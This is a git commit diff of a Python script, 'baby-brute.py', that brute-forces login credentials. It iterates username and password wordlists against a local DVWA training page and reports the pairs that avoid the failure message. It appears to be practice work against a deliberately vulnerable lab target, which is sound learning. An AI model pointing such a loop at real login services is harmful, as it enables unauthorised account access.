f1881df2fe64a02d2a2a7395e8b6e58632021029
Nicholas Tapia <tapzx2@Nicholass-MacBook-Air.local>
2022-03-02 07:52:54 -0800

    works

--- baby-brute.py
+++ baby-brute.py
@@ -1,4 +1,5 @@
-# try name/ value combo with 
+# try name / value combos
+# don't know how to 
 
 import argparse
 import urllib3 # https://urllib3.readthedocs.io/en/latest/user-guide.html
@@ -19,21 +20,32 @@ with open(args.users, "r") as f:
 with open(args.passwords, "r") as f:
     creds = f.read().split("\n")
 
+# clear previous runs of script
+with open('responses.txt', 'w') as f:
+    f.write('')
+
 # go through name / password combinations
 for name in names:
     for cred in creds:
-        print (name+':'+cred)
         try:
+            # create the request
             resp = http.request(
                 "GET",
                 f'http://127.0.0.1/dvwa/vulnerabilities/brute/index.php?username={name}&password={cred}&Login=Login',
-                retrys=False,
+                retries=False,
                 headers={
                     "Cookie": f"security=low; PHPSESSID={args.phpsessid}"
                 }
             )
+            # filter the bad login phrase
+            if "Username and/or password incorrect." not in resp.data.decode('utf-8'):
+                print('creds found:')
+                print(name+':'+cred)
+            # write all responses to file
             print(resp.read())
-            with open("responses.txt", "a") as f:
-                f.write(resp.read())
-        except:
-            print('exception')
+            with open("responses.txt", "ab") as f:
+                f.write(resp.data)
+        # show any exception as raise it
+        except BaseException as err:
+            print(f'Unexpected {err=}, {type(err)=}')
+            raise
